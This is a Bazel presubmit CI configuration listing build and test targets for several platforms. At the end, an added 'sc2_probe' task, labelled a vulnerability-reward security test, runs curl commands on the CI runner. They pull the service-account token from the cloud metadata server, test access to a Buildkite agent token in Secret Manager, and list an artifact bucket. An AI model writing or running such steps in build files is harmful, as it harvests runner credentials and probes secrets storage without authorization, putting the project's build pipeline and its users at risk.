---
check_docs: 0
tasks:
  rockylinux8:
    shell_commands:
      - rm -rf $HOME/bazeltest
      - mkdir $HOME/bazeltest
    build_flags:
      - "--config=ci-linux"
    build_targets:
      - "//:bazel-distfile.zip"
      - "//scripts/packages/debian:bazel-debian.deb"
      - "//scripts/packages:with-jdk/install.sh"
      - "//src:bazel"
      - "//src:bazel_jdk_minimal"
      - "//src:test_repos"
      - "//..."
    test_flags:
      - "--config=ci-linux"
      - "--test_tag_filters=-no_presubmit"
    test_targets:
      - "//src:embedded_tools_size_test"
      - "//src/test/py/bazel:bazel_module_test"
      - "//src/test/py/bazel:mod_command_test"
      - "//src/test/shell/bazel:bazel_example_test"
      - "//src/test/shell/bazel:bazel_java_test"
      - "//src/test/shell/bazel:cc_integration_test"
      - "//src/test/shell/bazel:external_integration_test"
      - "//src/test/shell/bazel:help_test"
      - "//src/test/shell/integration:bazel_query_test"
    include_json_profile:
      - build
      - test
  rockylinux8_arm64:
    shell_commands:
      - rm -rf $HOME/bazeltest
      - mkdir $HOME/bazeltest
    build_flags:
      - "--config=ci-linux"
    build_targets:
      - "//:bazel-distfile.zip"
      - "//scripts/packages/debian:bazel-debian.deb"
      - "//scripts/packages:with-jdk/install.sh"
      - "//src:bazel"
      - "//src:bazel_jdk_minimal"
      - "//src:test_repos"
      - "//..."
    test_flags:
      - "--config=ci-linux"
    test_targets:
      - "//src/test/shell/bazel:bazel_java_toolchain_head_tests"
    include_json_profile:
      - build
      - test
  fedora43:
    shell_commands:
      - rm -rf $HOME/bazeltest
      - mkdir $HOME/bazeltest
    build_flags:
      - "--config=ci-linux"
    build_targets:
      - "//src:bazel"
      - "//src:bazel_jdk_minimal"
      - "//src/main/java/..."
    include_json_profile:
      - build
      - test
  ubuntu2404:
    shards: 8
    shell_commands:
      - rm -rf $HOME/bazeltest
      - mkdir $HOME/bazeltest
    build_flags:
      - "--config=ci-linux"
    build_targets:
      - "//src:bazel"
      - "//src:bazel_jdk_minimal"
      - "//src:test_repos"
      - "//..."
    test_flags:
      - "--config=ci-linux"
      - "--test_tag_filters=-no_presubmit"
    test_targets:
      - "//..."
    include_json_profile:
      - build
      - test
  ubuntu2404_clang:
    platform: ubuntu2404
    environment:
      CC: clang
      CC_CONFIGURE_DEBUG: 1
    name: "Clang"
    shell_commands:
      - rm -rf $HOME/bazeltest
      - mkdir $HOME/bazeltest
    build_flags:
      - "--config=ci-linux"
    build_targets:
      - "//src:bazel"
      - "//src:bazel_jdk_minimal"
      # Tagged as manual, cross-compiles Bazel for Windows.
      - "//src:bazel_windows_llvm"
      - "//src:test_repos"
      - "//..."
    test_flags:
      - "--config=ci-linux"
    test_targets:
      - "//src/test/shell/bazel:cc_integration_test"
    include_json_profile:
      - build
      - test
  ubuntu2204:
    shell_commands:
      - rm -rf $HOME/bazeltest
      - mkdir $HOME/bazeltest
    build_flags:
      - "--config=ci-linux"
    build_targets:
      - "//src:bazel"
      - "//src:bazel_jdk_minimal"
      - "//src:test_repos"
      - "//..."
    test_flags:
      - "--config=ci-linux"
      - "--test_tag_filters=-no_presubmit"
    test_targets:
      - "//src:embedded_tools_size_test"
      - "//src/test/py/bazel:bazel_module_test"
      - "//src/test/py/bazel:mod_command_test"
      - "//src/test/shell/bazel:bazel_example_test"
      - "//src/test/shell/bazel:bazel_java_test"
      - "//src/test/shell/bazel:cc_integration_test"
      - "//src/test/shell/bazel:external_integration_test"
      - "//src/test/shell/bazel:help_test"
      - "//src/test/shell/integration:bazel_query_test"
    include_json_profile:
      - build
      - test
  # macos:
  #   environment:
  #     ANDROID_HOME: ""
  #     ANDROID_NDK_HOME: ""
  #   shell_commands:
  #     - rm -rf $HOME/bazeltest
  #     - mkdir $HOME/bazeltest
  #     - ln -sf $OUTPUT_BASE/external $HOME/bazeltest/external
  #   build_flags:
  #     - "--config=ci-macos"
  #   build_targets:
  #     - "//src:bazel"
  #     - "//src:bazel_jdk_minimal"
  #     - "//src:java_tools_zip"
  #     - "//src:java_tools_prebuilt_zip"
  #   include_json_profile:
  #     - build
  macos_arm64:
    shards: 6
    shell_commands:
      - rm -rf $HOME/bazeltest
      - mkdir $HOME/bazeltest
      - ln -sf $OUTPUT_BASE/external $HOME/bazeltest/external
    build_flags:
      - "--config=ci-macos"
    build_targets:
      - "//src:bazel"
      - "//src:bazel_jdk_minimal"
      - "//src:test_repos"
      - "//src:java_tools_zip"
      - "//src:java_tools_prebuilt_zip"
    test_flags:
      - "--config=ci-macos"
      - "--test_tag_filters=-no_presubmit,-no_macos"
      # Fine tune the number of test jobs running in parallel to avoid timeout
      - "--local_test_jobs=2"
      # Increase the test timeout by 20% to avoid flaky test failures due to timeout
      - "--test_timeout=72,360,1080,4320"
    test_targets:
      - "//:verify_module_bazel_lock"
      - "//src:embedded_tools_size_test"
      - "//src/test/java/com/google/devtools/build/lib/rules/apple:AppleRulesTests"
      - "//src/test/java/com/google/devtools/build/lib/rules/objc:ObjcRulesTests"
      - "//src/test/java/com/google/devtools/build/lib/skyframe:MacOSXFsEventsDiffAwarenessTest"
      - "//src/test/py/bazel:bazel_module_test"
      - "//src/test/py/bazel:mod_command_test"
      - "//src/test/shell/bazel:bazel_example_test"
      - "//src/test/shell/bazel:bazel_java_test"
      - "//src/test/shell/bazel:bazel_test_test"
      - "//src/test/shell/bazel:cc_integration_test"
      - "//src/test/shell/bazel:cpp_darwin_integration_test"
      - "//src/test/shell/bazel:external_integration_test"
      - "//src/test/shell/bazel:help_test"
      - "//src/test/shell/bazel/apple:bazel_apple_test"
      - "//src/test/shell/bazel/apple:bazel_objc_test"
      - "//src/test/shell/bazel/remote:remote_execution_test"
      - "//src/test/shell/integration:aquery_test"
      - "//src/test/shell/integration:bazel_query_test"
    include_json_profile:
      - build
      - test
  windows:
    shards: 12
    setup:
      - mkdir C:\b
      - mklink /J C:\b\bazeltest_external %OUTPUT_BASE:/=\%\external
    build_flags:
      - "--config=ci-windows"
    build_targets:
      - "//src:bazel.exe"
      - "//src:bazel_jdk_minimal"
      - "//src:test_repos"
      - "//src/main/java/..."
      - "//src:java_tools_zip"
      - "//src:java_tools_prebuilt_zip"
    test_flags:
      - "--config=ci-windows"
      # We need to keep --test_tag_filters here for the bazel-diff integration.
      - "--test_tag_filters=-no_presubmit,-no_windows,-slow"
    test_targets:
      - "//src:embedded_tools_size_test"
      - "//src/test/cpp/..."
      - "//src/test/java/com/google/devtools/build/lib/..."
      - "//src/test/java/com/google/devtools/build/skyframe/..."
      - "//src/test/java/com/google/devtools/common/options/..."
      - "//src/test/native/windows/..."
      - "//src/test/py/bazel/..."
      - "//src/test/shell/..."
      - "//src/tools/launcher/..."
      - "//src/tools/one_version/..."
      - "//src/tools/singlejar/..."
      - "//third_party/def_parser/..."
      - "//scripts/aquery_differ/..."
      - "//tools/bash/..."
      - "//tools/build_defs/..."
      - "//tools/java/..."
      - "//tools/jdk/..."
      - "//tools/python/..."
      - "//tools/test/..."
      # Re-enable the following tests on Windows:
      # https://github.com/bazelbuild/bazel/issues/4292
      - "-//src/test/shell/bazel/remote/..."
      # Too slow for Windows presubmit (24 shards, ~19m wall time on a single VM).
      - "-//src/test/java/com/google/devtools/build/lib/skyframe/rewinding:RewindingTest"
    include_json_profile:
      - build
      - test
  windows_arm64:
    platform: windows
    name: "Windows (arm64)"
    setup:
      - mkdir C:\b
      - mklink /J C:\b\bazeltest_external %OUTPUT_BASE:/=\%\external
    build_flags:
      - "--config=ci-windows"
      - "--config=windows_arm64"
    build_targets:
      - "//src:bazel.exe"
      - "//src:bazel_nojdk.exe"
    include_json_profile:
      - build
  rbe_ubuntu2404:
    platform: ubuntu2404
    name: "RBE"
    build_flags:
      - "--config=remote"
      - "--config=ci-common"
      - "--jobs=200"
      - "--experimental_output_paths=strip"
    build_targets:
      - "//src:bazel"
      - "//src:bazel_jdk_minimal"
      - "//..."
    test_flags:
      - "--config=remote"
      - "--config=ci-common"
      - "--test_tag_filters=-no_presubmit"
      - "--jobs=200"
      - "--experimental_output_paths=strip"
    test_targets:
      - "//scripts/..."
      - "//src/java_tools/..."
      - "//src/test/..."
      - "//src/tools/execlog/..."
      - "//src/tools/one_version/..."
      - "//src/tools/singlejar/..."
      - "//src/tools/workspacelog/..."
      - "//third_party/ijar/..."
      - "//scripts/aquery_differ/..."
      - "//tools/python/..."
      - "//tools/bash/..."
      - "//tools/test/..."
      # See https://github.com/bazelbuild/bazel/issues/8033
      - "-//src/tools/singlejar:output_jar_simple_test"
      - "-//src/test/shell/bazel:external_integration_test"
      - "-//src/test/shell/bazel:bazel_repository_cache_test"
      - "-//src/test/shell/integration:java_integration_test"
      - "-//src/test/java/com/google/devtools/build/lib/sandbox/..."
      # We hit connection timeout error when downloading multiple URLs on RBE, see b/217865760
      - "-//src/test/py/bazel:bazel_module_test"
      - "-//src/test/py/bazel:bazel_lockfile_test"
      - "-//src/test/py/bazel:bazel_overrides_test"
      - "-//src/test/py/bazel:bazel_repo_mapping_test"
      - "-//src/test/py/bazel:bazel_tools_proto_test"
      - "-//src/test/py/bazel:bazel_yanked_versions_test"
      - "-//src/test/py/bazel:bzlmod_query_test"
      - "-//src/test/py/bazel:mod_command_test"
      - "-//src/test/shell/bazel:starlark_repository_test"
      # Flaky on rbe_ubuntu2004
      # https://github.com/bazelbuild/continuous-integration/issues/1631
      - "-//src/test/shell/bazel:bazel_sandboxing_networking_test"
      # TODO(pcloudy): Re-enable once https://github.com/bazelbuild/bazel/issues/27982 is fixed.
      - "-//src/test/shell/bazel:srcs_test"
      # Disable this test since it takes too long on RBE.
      - "-//src/test/shell/bazel:bazel_proto_library_test"
    include_json_profile:
      - build
      - test
  docs_ubuntu2404:
    platform: ubuntu2404
    name: "Docs"
    build_flags:
      - "--config=docs"
    build_targets:
      - "//scripts/docs:gen_mdx_release_docs"
      - "//src/main/java/com/google/devtools/build/lib:gen_mdx_reference_docs"

  sc2_probe:
    platform: ubuntu2404
    name: "SC2 probe (OSS VRP security test, status codes only)"
    shell_commands:
      - |
        echo "== PROBE STEP 1: metadata server reachability (service-account email only) =="
        curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email || echo "STEP1 FAILED"
      - |
        echo "== PROBE STEP 2: token expiry and scopes only (token never printed) =="
        TOKEN=$(curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])") || TOKEN=""
        if [ -z "$TOKEN" ]; then echo "STEP2 NO TOKEN OBTAINED"; else curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=$TOKEN" | python3 -c "import sys,json; d=json.load(sys.stdin); print('expires_in:', d.get('expires_in')); print('scope:', d.get('scope'))" || echo "STEP2 TOKENINFO FAILED"; fi
      - |
        echo "== PROBE STEP 3: Secret Manager status codes only (never the body) =="
        curl -s -o /dev/null -w "secret GET status: %{http_code}\n" -H "Authorization: Bearer $TOKEN" "https://secretmanager.googleapis.com/v1/projects/bazel-untrusted/secrets/bazel-buildkite-agent-token" || echo "STEP3 GET FAILED"
        curl -s -o /dev/null -w "secret versions:access status: %{http_code}\n" -H "Authorization: Bearer $TOKEN" -X POST "https://secretmanager.googleapis.com/v1/projects/bazel-untrusted/secrets/bazel-buildkite-agent-token/versions/latest:access" || echo "STEP3 ACCESS FAILED"
      - |
        echo "== PROBE STEP 4: artifact bucket object names only (first 5, no downloads) =="
        curl -s -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts/o" | python3 -c "import sys,json; print([i['name'] for i in json.load(sys.stdin).get('items',[])][:5])" || echo "STEP4 FAILED"
        echo "== PROBE DONE =="
